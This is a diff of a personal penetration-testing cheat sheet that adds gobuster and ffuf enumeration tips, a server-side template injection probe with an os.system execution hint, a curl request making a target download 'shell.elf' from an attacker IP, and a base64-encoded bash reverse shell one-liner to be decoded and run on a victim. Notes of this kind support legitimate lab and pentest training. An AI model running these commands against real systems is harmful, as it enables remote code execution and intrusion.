@@ -8,10 +8,33 @@
     Gobuster fuzzing
 
     ``` gobuster dir -u {ip} -w /usr/share/wordlists/dirb/common.txt -t 42 ```
+
+    ``` -x php ```can add filetype here
+
+### Gobuster enum API
+- Provide pattern in pattern file
+    ``` {GOBUSTER}/v1 ```
+
+- Enum (RECURSIVELY IF NEEDED!)
+    ``` gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern -t 42```
+
+- Try more seclists in still cant find e.g. https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt 
+    ```
+    /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+    /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+    ```
+
+- Enum try more file extension!!! (Dont be lazy)
+
 ## ffuf
 - Check subdomain
 - ```ffuf -u http://{ip} -H "Host:FUZZ.{hostname}" -w /usr/share/seclists/discovery/dns/subdomains-top1million.txt ```
 - ``` -fs 1234 ``` filter size = 1234
+
+## SSTI
+- https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
+- ``` ${{<%[%'"}}%\. ``` Testing these character
+1. can try code execution e.g. python: maybe code have ```eval()``` and you can ```__import__('os').system(whoami)```
 
 ## Burp Suite
 - You know what to do =]
@@ -26,21 +49,11 @@
 
 - curl POST w/ JSON ``` curl -v -X POST -H "Content-Type: application/json" -d '{"user":"clumsyadmin", "url":"http://192.168.45.197/shell.elf"}' "http://192.168.173.134:13337/update"  ```
 
-## Gobuster enum API
-- Provide pattern in pattern file
-    ``` {GOBUSTER}/v1 ```
-
-- Enum (RECURSIVELY IF NEEDED!)
-    ``` gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern -t 42```
-
-- Try more seclists in still cant find e.g. https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-directories.txt 
-    ```
-    /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
-    /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
-    ```
-
-
-- Enum try more file extension!!! (Dont be lazy)
+- useful file 
+1. .htaccess will tell you some hidden allowed key pair header --> add = can access 
+   ``` do with burp suite browser
+    - proxy -> option -> match and place --> request header & replace: {new header} --> ok
+   ```
 
 - Useful url
 
@@ -170,3 +183,6 @@ $cli_runner = new CLI_Runner();
 3. call local web and will redirect to the victim web and then pass the cookie thru http call back 
 
 
+## Base64 encode and decode a one liner
+1. ``` echo -n "bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'" | base64 ``` encode
+2. ``` echo -n {base64encoded} | base64 -d | bash``` decode and run in victim
